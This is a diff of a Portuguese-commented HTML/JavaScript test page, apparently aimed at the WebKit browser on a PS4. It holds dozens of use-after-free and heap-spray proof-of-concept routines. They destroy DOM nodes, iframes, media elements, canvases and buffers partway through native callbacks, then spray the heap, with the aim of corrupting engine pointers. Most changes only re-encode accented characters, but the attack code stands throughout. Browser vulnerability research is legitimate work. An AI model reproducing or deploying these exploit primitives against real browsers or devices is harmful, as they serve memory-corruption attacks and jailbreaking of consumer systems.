@@ -74,8 +74,9 @@
     <button onclick="runTest215()">Teste 215: CSSOM Vector Reallocation Smash</button>
     
     <hr>
-    <h3>SaÌda / Registo:</h3>
-    <div id="output" style="white-space: pre-wrap; font-family: monospace;">A aguardar execuÁ„o...</div>
+    <h3>Sa√≠da / Registo:</h3>
+    <div id="output" style="white-space: pre-wrap; font-family: monospace;">A aguardar execu√ß√£o...</div>
+<div id="sandbox"></div>
 
     <div id="test-containers"></div>
 
@@ -95,7 +96,7 @@
             let spray = [];
             // Apenas 2000 arrays (baixo consumo de RAM, longe de OOM)
             for(let i = 0; i < 2000; i++) {
-                const poison = new Float64Array(128); // Bloco pequeno e r·pido
+                const poison = new Float64Array(128); // Bloco pequeno e r√°pido
                 poison.fill(2.121995791e-314); 
                 spray.push(poison);
             }
@@ -116,19 +117,19 @@
                 pai.appendChild(refChild);
                 container.appendChild(pai);
 
-                // O evento legado È SÕNCRONO. Pausa a funÁ„o C++ ContainerNode::insertBefore a meio.
+                // O evento legado √© S√çNCRONO. Pausa a fun√ß√£o C++ ContainerNode::insertBefore a meio.
                 pai.addEventListener('DOMNodeInserted', function handler(e) {
                     try {
-                        // 1. DestruÌmos o nÛ de referÍncia
+                        // 1. Destru√≠mos o n√≥ de refer√™ncia
                         refChild.remove();
                         refChild = null;
 
-                        // 2. Pulverizamos a memÛria para tentar ocupar o lugar do nÛ C++ original
+                        // 2. Pulverizamos a mem√≥ria para tentar ocupar o lugar do n√≥ C++ original
                         window.lixoPulverizado = heapSpray();
                         
-                        // 3. O C++ vai tentar continuar a inserÁ„o quando esta funÁ„o terminar
+                        // 3. O C++ vai tentar continuar a inser√ß√£o quando esta fun√ß√£o terminar
                         pai.removeEventListener('DOMNodeInserted', handler);
-                        logOutput("[Teste 151] Evento sÌncrono intercetado. refChild destruÌdo e Heap pulverizado.");
+                        logOutput("[Teste 151] Evento s√≠ncrono intercetado. refChild destru√≠do e Heap pulverizado.");
                     } catch(err) {}
                 });
 
@@ -148,7 +149,7 @@
             try {
                 const container = document.getElementById('test-containers');
                 let video = document.createElement('video');
-                // Adiciona um source vazio para engatilhar a lÛgica de rede C++
+                // Adiciona um source vazio para engatilhar a l√≥gica de rede C++
                 video.src = "blob:null"; 
                 container.appendChild(video);
 
@@ -157,12 +158,12 @@
 
                 if (playPromise !== undefined) {
                     playPromise.then(() => {
-                        logOutput("[Teste 152] Promise resolvida ignorando a destruiÁ„o.");
+                        logOutput("[Teste 152] Promise resolvida ignorando a destrui√ß√£o.");
                     }).catch(error => {
                         logOutput("[Teste 152] C++ rejeitou a Promise de forma segura: " + error);
                     });
 
-                    // Microtask: Aniquila o vÌdeo antes da Promise C++ ter a chance de notificar o JS
+                    // Microtask: Aniquila o v√≠deo antes da Promise C++ ter a chance de notificar o JS
                     queueMicrotask(() => {
                         video.remove();
                         video = null;
@@ -170,10 +171,10 @@
                         logOutput("[Teste 152] HTMLMediaElement aniquilado enquanto a Promise nativa estava pendente.");
                     });
                 } else {
-                    logOutput("[Teste 152] play() n„o retornou Promise (comportamento de WebKit antigo confirmado).");
+                    logOutput("[Teste 152] play() n√£o retornou Promise (comportamento de WebKit antigo confirmado).");
                 }
             } catch(e) {
-                logOutput("[Teste 152] Falha na gest„o assÌncrona da media: " + e);
+                logOutput("[Teste 152] Falha na gest√£o ass√≠ncrona da media: " + e);
             }
         }
 
@@ -187,25 +188,25 @@
                 let iframe = document.createElement('iframe');
                 container.appendChild(iframe);
 
-                // Roubamos a referÍncia direta da funÁ„o nativa do contexto do iframe
+                // Roubamos a refer√™ncia direta da fun√ß√£o nativa do contexto do iframe
                 let timeoutRoubado = iframe.contentWindow.setTimeout;
 
-                // DestruÌmos o iframe (aciona DOMWindow::disconnectFrame no C++)
+                // Destru√≠mos o iframe (aciona DOMWindow::disconnectFrame no C++)
                 iframe.remove();
                 iframe = null;
 
-                // Pulverizamos a memÛria para sujar o heap onde o DOMWindow estava
+                // Pulverizamos a mem√≥ria para sujar o heap onde o DOMWindow estava
                 window.sprayWindow = heapSpray();
 
-                // Tentamos invocar a funÁ„o C++ roubada. Ela tentar· aceder ao contexto interno destruÌdo.
+                // Tentamos invocar a fun√ß√£o C++ roubada. Ela tentar√° aceder ao contexto interno destru√≠do.
                 timeoutRoubado(() => {
-                    logOutput("[Teste 153] C”DIGO FANTASMA EXECUTADO! O motor n„o validou a destruiÁ„o do frame.");
+                    logOutput("[Teste 153] C√ìDIGO FANTASMA EXECUTADO! O motor n√£o validou a destrui√ß√£o do frame.");
                 }, 0);
 
-                logOutput("[Teste 153] ReferÍncia invocada num DOMWindow desanexado. A aguardar crash assÌncrono...");
+                logOutput("[Teste 153] Refer√™ncia invocada num DOMWindow desanexado. A aguardar crash ass√≠ncrono...");
 
             } catch(e) {
-                logOutput("[Teste 153] Motor isolou a referÍncia roubada com sucesso: " + e);
+                logOutput("[Teste 153] Motor isolou a refer√™ncia roubada com sucesso: " + e);
             }
         }
 
@@ -228,12 +229,12 @@
                 avo.addEventListener('click', function(e) {
                     try {
                         // O C++ calculou a rota (avo -> pai -> filho)
-                        // DestruÌmos os nÛs subsequentes da memÛria antes que o C++ l· chegue
+                        // Destru√≠mos os n√≥s subsequentes da mem√≥ria antes que o C++ l√° chegue
                         avo.innerHTML = '';
                         
                         // Pulverizamos para corromper a tabela de despacho de eventos C++
                         window.sprayEventos = heapSpray();
-                        logOutput("[Teste 154] ¡rvore destruÌda na fase de captura. Despacho C++ a caminho de um nÛ fantasma.");
+                        logOutput("[Teste 154] √Årvore destru√≠da na fase de captura. Despacho C++ a caminho de um n√≥ fantasma.");
                     } catch(err) {}
                 }, true); // true = Use Capture
 
@@ -241,7 +242,7 @@
                 filho.dispatchEvent(new MouseEvent('click', { bubbles: true }));
 
             } catch(e) {
-                logOutput("[Teste 154] Motor WebKit recalcula a tabela de eventos dinamicamente com seguranÁa: " + e);
+                logOutput("[Teste 154] Motor WebKit recalcula a tabela de eventos dinamicamente com seguran√ßa: " + e);
             }
         }
 
@@ -258,27 +259,27 @@
                 alvo.onsuspend = function() {
                     try {
                         alvo.remove();
-                        // Neste momento, o ponteiro de media no C++ est· orf„o.
-                        // Em vez de um GC brando, forÁamos o limite de RAM do processo aba (abaixo do limite de OOM kill do PS4)
+                        // Neste momento, o ponteiro de media no C++ est√° orf√£o.
+                        // Em vez de um GC brando, for√ßamos o limite de RAM do processo aba (abaixo do limite de OOM kill do PS4)
                         let matrizGigante = [];
                         try {
-                            // AlocaÁ„o bloqueante massiva para esmagar a memÛria livre
+                            // Aloca√ß√£o bloqueante massiva para esmagar a mem√≥ria livre
                             for(let i = 0; i < 50000; i++) {
                                 matrizGigante.push(new ArrayBuffer(1024 * 64)); // blocos de 64KB
                             }
                         } catch(oom) {
                             // Se bater no limite de RAM, o GC vai rodar obrigatoriamente
-                            logOutput("[Teste 155] Limite de RAM atingido propositadamente para forÁar GC.");
+                            logOutput("[Teste 155] Limite de RAM atingido propositadamente para for√ßar GC.");
                         }
                         
-                        logOutput("[Teste 155] OOM simulado concluÌdo a meio da suspens„o de hardware.");
+                        logOutput("[Teste 155] OOM simulado conclu√≠do a meio da suspens√£o de hardware.");
                     } catch(err) {}
                 };
 
                 alvo.dispatchEvent(new Event('suspend'));
 
             } catch(e) {
-                logOutput("[Teste 155] Sobrecarga de memÛria lidada sem falha de segmentaÁ„o: " + e);
+                logOutput("[Teste 155] Sobrecarga de mem√≥ria lidada sem falha de segmenta√ß√£o: " + e);
             }
         }
 // ==========================================
@@ -296,14 +297,14 @@
                 doc.write(`
                     <body>
                         <script>
-                            // Este evento ser· acionado nativamente pelo C++ quando o iframe navegar
+                            // Este evento ser√° acionado nativamente pelo C++ quando o iframe navegar
                             window.onunload = function() {
                                 try {
-                                    // Acessa o frame pai e destrÛi o contentor do prÛprio iframe
+                                    // Acessa o frame pai e destr√≥i o contentor do pr√≥prio iframe
                                     let meuContentor = window.parent.document.getElementById('test-containers');
                                     meuContentor.innerHTML = '';
                                     
-                                    // Pulveriza a memÛria na thread principal enquanto o C++ ainda est· no unload
+                                    // Pulveriza a mem√≥ria na thread principal enquanto o C++ ainda est√° no unload
                                     window.parent.sprayIframe = window.parent.heapSpray();
                                 } catch(e) {}
                             };
@@ -312,14 +313,14 @@
                 `);
                 doc.close();
 
-                // ForÁa a navegaÁ„o REAL. O C++ inicia o processo assÌncrono de teardown.
+                // For√ßa a navega√ß√£o REAL. O C++ inicia o processo ass√≠ncrono de teardown.
                 setTimeout(() => {
                     iframe.src = "about:blank";
-                    logOutput("[Teste 156] NavegaÁ„o real engatilhada. unload nativo intercetado e memÛria pulverizada.");
+                    logOutput("[Teste 156] Navega√ß√£o real engatilhada. unload nativo intercetado e mem√≥ria pulverizada.");
                 }, 100);
 
             } catch(e) {
-                logOutput("[Teste 156] Erro na gest„o de iframe real: " + e);
+                logOutput("[Teste 156] Erro na gest√£o de iframe real: " + e);
             }
         }
 
@@ -333,7 +334,7 @@
                 let video = document.createElement('video');
                 container.appendChild(video);
 
-                // Criamos um MP4 falso mÌnimo e v·lido para o parser C++ tentar ler
+                // Criamos um MP4 falso m√≠nimo e v√°lido para o parser C++ tentar ler
                 let dummyMP4 = new Uint8Array([
                     0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70, // ftyp
                     0x69, 0x73, 0x6F, 0x6D, 0x00, 0x00, 0x02, 0x00,
@@ -345,14 +346,14 @@
                 // Quando o C++ abrir a thread de I/O e confirmar os metadados...
                 video.onloadedmetadata = function() {
                     try {
-                        // O motor est· com os ponteiros ativamente abertos.
-                        // Revogamos o acesso, destruÌmos o nÛ e enchemos o Heap de lixo.
+                        // O motor est√° com os ponteiros ativamente abertos.
+                        // Revogamos o acesso, destru√≠mos o n√≥ e enchemos o Heap de lixo.
                         URL.revokeObjectURL(url);
                         video.remove();
                         video = null;
                         
                         window.sprayMedia = heapSpray();
-                        logOutput("[Teste 157] Parser MP4 genuÌno atacado. Ponteiro destruÌdo e memÛria sobreescrita.");
+                        logOutput("[Teste 157] Parser MP4 genu√≠no atacado. Ponteiro destru√≠do e mem√≥ria sobreescrita.");
                     } catch(err) {}
                 };
 
@@ -376,11 +377,11 @@
                 raiz.appendChild(filho);
                 container.appendChild(raiz);
 
-                // O C++ chama esta funÁ„o nativamente a cada passo da travessia
+                // O C++ chama esta fun√ß√£o nativamente a cada passo da travessia
                 let filtroNatividade = {
                     acceptNode: function(node) {
                         if (node.tagName === 'SPAN') {
-                            // A meio da travessia C++, nÛs aniquilamos a ·rvore inteira
+                            // A meio da travessia C++, n√≥s aniquilamos a √°rvore inteira
                             raiz.remove();
                             // Pulverizamos para tentar corromper o ponteiro interno 'currentNode' do WebKit
                             window.sprayWalker = heapSpray();
@@ -392,13 +393,13 @@
 
                 let walker = document.createTreeWalker(raiz, NodeFilter.SHOW_ELEMENT, filtroNatividade, false);
 
-                // Esta chamada desce para o C++, que ent„o invoca o nosso filtro de volta
+                // Esta chamada desce para o C++, que ent√£o invoca o nosso filtro de volta
                 walker.nextNode();
                 
-                logOutput("[Teste 158] Filtro TreeWalker C++ corrompido com sucesso durante a iteraÁ„o.");
+                logOutput("[Teste 158] Filtro TreeWalker C++ corrompido com sucesso durante a itera√ß√£o.");
 
             } catch(e) {
-                logOutput("[Teste 158] TreeWalker seguro contra mutaÁıes destrutivas a meio da travessia: " + e);
+                logOutput("[Teste 158] TreeWalker seguro contra muta√ß√µes destrutivas a meio da travessia: " + e);
             }
         }
 
@@ -410,7 +411,7 @@
             try {
                 const container = document.getElementById('test-containers');
                 
-                // Iframe invisÌvel para n„o sairmos da p·gina durante o teste
+                // Iframe invis√≠vel para n√£o sairmos da p√°gina durante o teste
                 let frameAlvo = document.createElement('iframe');
                 frameAlvo.name = "frameAlvoNativo";
                 container.appendChild(frameAlvo);
@@ -423,21 +424,21 @@
 
                 form.onsubmit = function() {
                     try {
-                        // A thread principal C++ validou a submiss„o e est· a criar o pacote de rede.
-                        // Aniquilamos o formul·rio da memÛria e pulverizamos.
+                        // A thread principal C++ validou a submiss√£o e est√° a criar o pacote de rede.
+                        // Aniquilamos o formul√°rio da mem√≥ria e pulverizamos.
                         form.remove();
                         form = null;
                         
                         window.sprayForm = heapSpray();
-                        logOutput("[Teste 159] Submiss„o IPC genuÌna interrompida por UAF e Heap Spray.");
+                        logOutput("[Teste 159] Submiss√£o IPC genu√≠na interrompida por UAF e Heap Spray.");
                     } catch(err) {}
                 };
 
-                // A chamada form.submit() desvia as proteÁıes e aciona a m·quina nativa diretamente
+                // A chamada form.submit() desvia as prote√ß√µes e aciona a m√°quina nativa diretamente
                 form.submit();
 
             } catch(e) {
-                logOutput("[Teste 159] Gestor de submiss„o do WebCore geriu a desanexaÁ„o perfeitamente: " + e);
+                logOutput("[Teste 159] Gestor de submiss√£o do WebCore geriu a desanexa√ß√£o perfeitamente: " + e);
             }
         }
 
@@ -461,8 +462,8 @@
                 // Associa a rotina ao ciclo de pintura real do GPU/Renderer do WebKit
                 requestAnimationFrame(() => {
                     try {
-                        // O C++ vai pintar a tela no prÛximo microsegundo.
-                        // Apagamos a regra estrutural no ˙ltimo instante possÌvel.
+                        // O C++ vai pintar a tela no pr√≥ximo microsegundo.
+                        // Apagamos a regra estrutural no √∫ltimo instante poss√≠vel.
                         sheet.deleteRule(0);
                         
                         // Pulverizamos imediatamente para sujar o motor de layout
@@ -476,7 +477,7 @@
                 });
 
             } catch(e) {
-                logOutput("[Teste 160] Pipeline de renderizaÁ„o ‡ prova de corrupÁ„o sÌncrona de CSSOM: " + e);
+                logOutput("[Teste 160] Pipeline de renderiza√ß√£o √† prova de corrup√ß√£o s√≠ncrona de CSSOM: " + e);
             }
         }
 // ==========================================
@@ -485,13 +486,13 @@
         function runTest161() {
             clearOutput();
             try {
-                // Tenta ligar a um porto local fechado para forÁar a rotina C++ de erro de I/O
+                // Tenta ligar a um porto local fechado para for√ßar a rotina C++ de erro de I/O
                 let ws = new WebSocket("ws://127.0.0.1:55555");
                 
                 ws.onerror = function() {
                     try {
-                        // O C++ reportou o erro. A thread de rede est· ativamente a manipular este objeto.
-                        // Ordenamos o encerramento do descritor nativo e aniquilamos a referÍncia JS.
+                        // O C++ reportou o erro. A thread de rede est√° ativamente a manipular este objeto.
+                        // Ordenamos o encerramento do descritor nativo e aniquilamos a refer√™ncia JS.
                         ws.close();
                         ws = null;
                         
@@ -502,7 +503,7 @@
                     } catch(err) {}
                 };
             } catch(e) {
-                logOutput("[Teste 161] O motor impediu a criaÁ„o do Socket ou do UAF: " + e);
+                logOutput("[Teste 161] O motor impediu a cria√ß√£o do Socket ou do UAF: " + e);
             }
         }
 
@@ -515,25 +516,25 @@
                 const container = document.getElementById('test-containers');
                 let img = new Image();
                 
-                // SVG complexo embutido (forÁa o parser C++ a alocar estruturas XML)
+                // SVG complexo embutido (for√ßa o parser C++ a alocar estruturas XML)
                 let svgPayload = "<svg xmlns='http://www.w3.org/2000/svg'><circle cx='50' cy='50' r='40' fill='red'/></svg>";
                 img.src = "data:image/svg+xml;base64," + btoa(svgPayload);
                 container.appendChild(img);
 
                 img.onload = function() {
                     try {
-                        // O motor gr·fico C++ terminou de renderizar os pixÈis na memÛria.
-                        // DestruÌmos o nÛ da ·rvore de renderizaÁ„o violentamente.
+                        // O motor gr√°fico C++ terminou de renderizar os pix√©is na mem√≥ria.
+                        // Destru√≠mos o n√≥ da √°rvore de renderiza√ß√£o violentamente.
                         img.remove();
                         img = null;
                         
                         window.sprayImg = heapSpray();
                         
-                        logOutput("[Teste 162] Descodificador de imagem acionado. NÛ removido apÛs o parse XML.");
+                        logOutput("[Teste 162] Descodificador de imagem acionado. N√≥ removido ap√≥s o parse XML.");
                     } catch(err) {}
                 };
             } catch(e) {
-                logOutput("[Teste 162] Engine gr·fica est·vel contra a destruiÁ„o da imagem: " + e);
+                logOutput("[Teste 162] Engine gr√°fica est√°vel contra a destrui√ß√£o da imagem: " + e);
             }
         }
 
@@ -550,13 +551,13 @@
                 container.appendChild(canvas);
                 let ctx = canvas.getContext('2d');
 
-                // Cria um buffer de 4MB de pixÈis
+                // Cria um buffer de 4MB de pix√©is
                 let imgData = ctx.createImageData(1000, 1000);
 
                 let armadilha = {
                     valueOf: function() {
-                        // O C++ preparou a cÛpia de memÛria em bloco (memcpy nativo).
-                        // Pausou para ler a coordenada Y. DestruÌmos a superfÌcie de destino definindo a dimens„o a zero.
+                        // O C++ preparou a c√≥pia de mem√≥ria em bloco (memcpy nativo).
+                        // Pausou para ler a coordenada Y. Destru√≠mos a superf√≠cie de destino definindo a dimens√£o a zero.
                         canvas.width = 0;
                         canvas.height = 0;
                         
@@ -566,15 +567,15 @@
                     }
                 };
 
-                // Tenta forÁar o Buffer Overflow ou UAF na cÛpia nativa
+                // Tenta for√ßar o Buffer Overflow ou UAF na c√≥pia nativa
                 try {
                     ctx.putImageData(imgData, 0, armadilha);
-                    logOutput("[Teste 163] putImageData lidou com a destruiÁ„o sÌncrona da superfÌcie com seguranÁa.");
+                    logOutput("[Teste 163] putImageData lidou com a destrui√ß√£o s√≠ncrona da superf√≠cie com seguran√ßa.");
                 } catch(e) {
-                    logOutput("[Teste 163] Motor C++ intercetou a anomalia geomÈtrica antes de escrever: " + e);
+                    logOutput("[Teste 163] Motor C++ intercetou a anomalia geom√©trica antes de escrever: " + e);
                 }
             } catch(e) {
-                logOutput("[Teste 163] Falha na alocaÁ„o do Canvas 2D: " + e);
+                logOutput("[Teste 163] Falha na aloca√ß√£o do Canvas 2D: " + e);
             }
         }
 
@@ -584,20 +585,20 @@
         function runTest164() {
             clearOutput();
             try {
-                // Abre a ligaÁ„o real
+                // Abre a liga√ß√£o real
                 let request = indexedDB.open("PoC_Vuln_DB", 1);
                 
                 request.onsuccess = function(event) {
                     try {
                         let db = event.target.result;
                         
-                        // O C++ estabilizou a ligaÁ„o com o ficheiro no disco.
-                        // Imediatamente fechamos o handle e invocamos a eliminaÁ„o fÌsica.
+                        // O C++ estabilizou a liga√ß√£o com o ficheiro no disco.
+                        // Imediatamente fechamos o handle e invocamos a elimina√ß√£o f√≠sica.
                         db.close();
                         let deleteRequest = indexedDB.deleteDatabase("PoC_Vuln_DB");
                         
                         deleteRequest.onsuccess = function() {
-                            logOutput("[Teste 164] deleteDatabase executado nativamente sem corrupÁ„o no gestor I/O.");
+                            logOutput("[Teste 164] deleteDatabase executado nativamente sem corrup√ß√£o no gestor I/O.");
                         };
                         
                         // Pulverizamos a RAM da thread principal enquanto a thread de I/O apaga os ficheiros
@@ -609,7 +610,7 @@
                     logOutput("[Teste 164] Erro seguro ao abrir o IndexedDB.");
                 };
             } catch(e) {
-                logOutput("[Teste 164] Fila de I/O do IndexedDB colapsou com o bloqueio sÌncrono: " + e);
+                logOutput("[Teste 164] Fila de I/O do IndexedDB colapsou com o bloqueio s√≠ncrono: " + e);
             }
         }
 
@@ -619,21 +620,21 @@
         function runTest165() {
             clearOutput();
             try {
-                // Cria um canal de comunicaÁ„o de memÛria partilhada genuÌno
+                // Cria um canal de comunica√ß√£o de mem√≥ria partilhada genu√≠no
                 let channel = new MessageChannel();
                 
                 // Um payload suficientemente grande para obrigar o IPC a fragmentar ou demorar milissegundos
                 let payload = new Uint8Array(2 * 1024 * 1024); // 2MB
                 
                 channel.port2.onmessage = function(e) {
-                    logOutput("[Teste 165] Mensagem sobreviveu e chegou ‡ porta 2.");
+                    logOutput("[Teste 165] Mensagem sobreviveu e chegou √† porta 2.");
                 };
 
                 // Inicia o envio
                 channel.port1.postMessage(payload);
 
-                // O C++ est· a transferir os dados na fila IPC nativa.
-                // Fechamos violentamente a porta de destino e apagamos as referÍncias.
+                // O C++ est√° a transferir os dados na fila IPC nativa.
+                // Fechamos violentamente a porta de destino e apagamos as refer√™ncias.
                 channel.port2.close();
                 channel.port1.close();
                 channel = null;
@@ -641,10 +642,10 @@
                 // Pulverizamos o heap para tentar corromper as portas no C++
                 window.sprayIPC = heapSpray();
                 
-                logOutput("[Teste 165] Carga IPC massiva enviada e portas fechadas a meio do tr‚nsito. A aguardar estabilizaÁ„o.");
+                logOutput("[Teste 165] Carga IPC massiva enviada e portas fechadas a meio do tr√¢nsito. A aguardar estabiliza√ß√£o.");
 
             } catch(e) {
-                logOutput("[Teste 165] Motor WebCore protegeu a fila IPC de mensagens Ûrf„s: " + e);
+                logOutput("[Teste 165] Motor WebCore protegeu a fila IPC de mensagens √≥rf√£s: " + e);
             }
         }
 // ==========================================
@@ -653,25 +654,25 @@
         function runTest166() {
             clearOutput();
             try {
-                // Aloca 1MB na memÛria
+                // Aloca 1MB na mem√≥ria
                 let buffer = new ArrayBuffer(1024 * 1024);
                 let view = new Uint8Array(buffer);
                 view[0] = 0xAA;
 
-                // Transfere a propriedade absoluta da memÛria para o abismo nativo
+                // Transfere a propriedade absoluta da mem√≥ria para o abismo nativo
                 // O WebKit tem de desanexar (detach) o buffer original
                 try {
                     structuredClone(buffer, { transfer: [buffer] });
                 } catch(e) {
-                    logOutput("[Teste 166] structuredClone falhou ou n„o suporta a flag de transferÍncia nesta build.");
+                    logOutput("[Teste 166] structuredClone falhou ou n√£o suporta a flag de transfer√™ncia nesta build.");
                     return;
                 }
 
-                // Pulveriza imediatamente a memÛria livre
+                // Pulveriza imediatamente a mem√≥ria livre
                 window.sprayTransfer = heapSpray();
 
-                // Tenta aceder ‡ vista do buffer desanexado.
-                // Se a engine n„o tiver invalidado os ponteiros internos da vista, temos acesso a memÛria morta.
+                // Tenta aceder √† vista do buffer desanexado.
+                // Se a engine n√£o tiver invalidado os ponteiros internos da vista, temos acesso a mem√≥ria morta.
                 try {
                     let leituraFantasma = view[0];
                     if (leituraFantasma === 0x41) { // 0x41 = 'A' (resultado do spray)
@@ -682,7 +683,7 @@
                 } catch(ignora) {}
 
             } catch(e) {
-                logOutput("[Teste 166] Falha de proteÁ„o do motor JavaScriptCore: " + e);
+                logOutput("[Teste 166] Falha de prote√ß√£o do motor JavaScriptCore: " + e);
             }
         }
 
@@ -694,31 +695,31 @@
             try {
                 const container = document.getElementById('test-containers');
                 
-                // Cria um invÛlucro para poder ser aniquilado com outerHTML
+                // Cria um inv√≥lucro para poder ser aniquilado com outerHTML
                 container.innerHTML = '<div id="wrapperAlvo"></div>';
                 let wrapper = document.getElementById('wrapperAlvo');
                 
                 let obj = document.createElement('object');
                 obj.type = 'text/html';
-                obj.data = 'about:blank'; // ForÁa a engine a criar um contexto sub-documento
+                obj.data = 'about:blank'; // For√ßa a engine a criar um contexto sub-documento
                 
                 obj.onload = function() {
                     try {
                         // A engine C++ terminou de carregar o sub-documento.
-                        // Apagamos brutalmente o wrapper da memÛria usando o setter destrutivo
+                        // Apagamos brutalmente o wrapper da mem√≥ria usando o setter destrutivo
                         wrapper.outerHTML = '<p>Aniquilado</p>';
                         
                         // Pulverizamos a RAM na tentativa de corromper o contexto do object que acabou de notificar a thread
                         window.sprayObj = heapSpray();
                         
-                        logOutput("[Teste 167] Contexto do <object> assassinado durante o carregamento. C++ n„o colapsou.");
+                        logOutput("[Teste 167] Contexto do <object> assassinado durante o carregamento. C++ n√£o colapsou.");
                     } catch(err) {}
                 };
 
                 wrapper.appendChild(obj);
 
             } catch(e) {
-                logOutput("[Teste 167] Erro na gest„o nativa de plugins e sub-documentos: " + e);
+                logOutput("[Teste 167] Erro na gest√£o nativa de plugins e sub-documentos: " + e);
             }
         }
 
@@ -742,22 +743,22 @@
 
                 track.oncuechange = function() {
                     try {
-                        // O C++ MediaElement est· a tentar desenhar a legenda no ecr„.
-                        // Apagamos o nÛ de vÌdeo e forÁamos a limpeza das faixas de texto
+                        // O C++ MediaElement est√° a tentar desenhar a legenda no ecr√£.
+                        // Apagamos o n√≥ de v√≠deo e for√ßamos a limpeza das faixas de texto
                         video.remove();
                         video = null;
                         
                         window.sprayTrack = heapSpray();
-                        logOutput("[Teste 168] Faixa de texto apagada e pulverizada durante a notificaÁ„o de cuechange.");
+                        logOutput("[Teste 168] Faixa de texto apagada e pulverizada durante a notifica√ß√£o de cuechange.");
                         track.oncuechange = null;
                     } catch(err) {}
                 };
 
-                // ForÁamos o avanÁo do tempo para engatilhar o disparo real no C++
+                // For√ßamos o avan√ßo do tempo para engatilhar o disparo real no C++
                 video.currentTime = 5;
 
             } catch(e) {
-                logOutput("[Teste 168] O motor do HTMLMediaElement geriu as estruturas VTTCue em seguranÁa: " + e);
+                logOutput("[Teste 168] O motor do HTMLMediaElement geriu as estruturas VTTCue em seguran√ßa: " + e);
             }
         }
 
@@ -775,11 +776,11 @@
                 let alvo = docIframe.createElement('div');
                 docIframe.body.appendChild(alvo);
 
-                // Colocamos o observador a vigiar a ·rvore DOM interna do iframe
+                // Colocamos o observador a vigiar a √°rvore DOM interna do iframe
                 let observador = new MutationObserver((mutacoes) => {
                     try {
-                        // O C++ agrupou as mutaÁıes e chamou a microtarefa.
-                        // DestruÌmos o iframe original (DOMWindow::disconnectFrame)
+                        // O C++ agrupou as muta√ß√µes e chamou a microtarefa.
+                        // Destru√≠mos o iframe original (DOMWindow::disconnectFrame)
                         iframe.remove();
                         iframe = null;
                         
@@ -790,7 +791,7 @@
 
                 observador.observe(docIframe.body, { childList: true });
 
-                // Injetamos mutaÁıes reais para ativar a engine nativa
+                // Injetamos muta√ß√µes reais para ativar a engine nativa
                 let lixoDOM = docIframe.createElement('span');
                 alvo.appendChild(lixoDOM);
 
@@ -806,32 +807,32 @@
             clearOutput();
             try {
                 let img = new Image();
-                // Cria um SVG imenso para forÁar uma longa descodificaÁ„o assÌncrona no C++
+                // Cria um SVG imenso para for√ßar uma longa descodifica√ß√£o ass√≠ncrona no C++
                 let payload = "<svg xmlns='http://www.w3.org/2000/svg'><path d='" + "M10 10 L90 90 ".repeat(5000) + "'/></svg>";
                 img.src = "data:image/svg+xml;base64," + btoa(payload);
 
-                // A funÁ„o decode() desce ‡ thread gr·fica do WebKit e retorna uma Promise
+                // A fun√ß√£o decode() desce √† thread gr√°fica do WebKit e retorna uma Promise
                 if (typeof img.decode === 'function') {
                     let decodePromise = img.decode();
 
                     decodePromise.then(() => {
-                        logOutput("[Teste 170] A Promise nativa resolveu ignorando a destruiÁ„o prematura.");
+                        logOutput("[Teste 170] A Promise nativa resolveu ignorando a destrui√ß√£o prematura.");
                     }).catch((err) => {
-                        logOutput("[Teste 170] O descodificador abortou com sucesso a operaÁ„o: " + err);
+                        logOutput("[Teste 170] O descodificador abortou com sucesso a opera√ß√£o: " + err);
                     });
 
-                    // Enquanto o C++ est· a decifrar a imagem na outra thread, destruÌmos o host
+                    // Enquanto o C++ est√° a decifrar a imagem na outra thread, destru√≠mos o host
                     img.src = "";
                     img = null;
                     
                     window.sprayDecode = heapSpray();
-                    logOutput("[Teste 170] img.decode() disparado. Alvo de memÛria pulverizado enquanto o C++ calcula os vetores.");
+                    logOutput("[Teste 170] img.decode() disparado. Alvo de mem√≥ria pulverizado enquanto o C++ calcula os vetores.");
                 } else {
-                    logOutput("[Teste 170] A API moderna img.decode() n„o est· presente nesta vers„o do WebKit.");
+                    logOutput("[Teste 170] A API moderna img.decode() n√£o est√° presente nesta vers√£o do WebKit.");
                 }
 
             } catch(e) {
-                logOutput("[Teste 170] Motor gr·fico n„o colapsou com o abandono assÌncrono: " + e);
+                logOutput("[Teste 170] Motor gr√°fico n√£o colapsou com o abandono ass√≠ncrono: " + e);
             }
         }
  // ==========================================
@@ -844,7 +845,7 @@
                 let base = document.createElement('div');
                 container.appendChild(base);
 
-                // Criamos um iframe dentro da div que ser· o nosso "espi„o" sÌncrono
+                // Criamos um iframe dentro da div que ser√° o nosso "espi√£o" s√≠ncrono
                 let iframe = document.createElement('iframe');
                 base.appendChild(iframe);
                 
@@ -854,8 +855,8 @@
                     <script>
                         window.onunload = function() {
                             try {
-                                // O C++ est· a meio da execuÁ„o de range.deleteContents() e pausou para este unload.
-                                // DestruÌmos violentamente o contentor base inteiro.
+                                // O C++ est√° a meio da execu√ß√£o de range.deleteContents() e pausou para este unload.
+                                // Destru√≠mos violentamente o contentor base inteiro.
                                 let c = window.parent.document.getElementById('test-containers');
                                 c.innerHTML = '';
                                 
@@ -872,10 +873,10 @@
                 range.selectNodeContents(base);
 
                 // Dispara a rotina massiva no ContainerNode.cpp
-                // A engine vai tentar apagar o iframe, disparando o onunload de forma sÌncrona!
+                // A engine vai tentar apagar o iframe, disparando o onunload de forma s√≠ncrona!
                 range.deleteContents();
 
-                logOutput("[Teste 171] deleteContents finalizou. O C++ sobreviveu ‡ aniquilaÁ„o do iterador a meio da travessia.");
+                logOutput("[Teste 171] deleteContents finalizou. O C++ sobreviveu √† aniquila√ß√£o do iterador a meio da travessia.");
             } catch(e) {
                 logOutput("[Teste 171] Iterador de Range no WebCore colapsou: " + e);
             }
@@ -893,21 +894,21 @@
 
                 iframe.contentWindow.onhashchange = function() {
                     try {
-                        // O C++ DOMWindow est· a atualizar as estruturas de histÛrico.
+                        // O C++ DOMWindow est√° a atualizar as estruturas de hist√≥rico.
                         // Removemos o iframe, acionando o disconnectFrame nativo.
                         iframe.remove();
                         iframe = null;
                         
                         window.sprayHash = heapSpray();
-                        logOutput("[Teste 172] onhashchange genuÌno intercetado. Iframe destruÌdo e Heap pulverizado.");
+                        logOutput("[Teste 172] onhashchange genu√≠no intercetado. Iframe destru√≠do e Heap pulverizado.");
                     } catch(err) {}
                 };
 
-                // ForÁamos uma navegaÁ„o real de ‚ncora
+                // For√ßamos uma navega√ß√£o real de √¢ncora
                 iframe.src = "about:blank#vuln";
 
             } catch(e) {
-                logOutput("[Teste 172] Motor de histÛrico da janela colapsou perante a desanexaÁ„o: " + e);
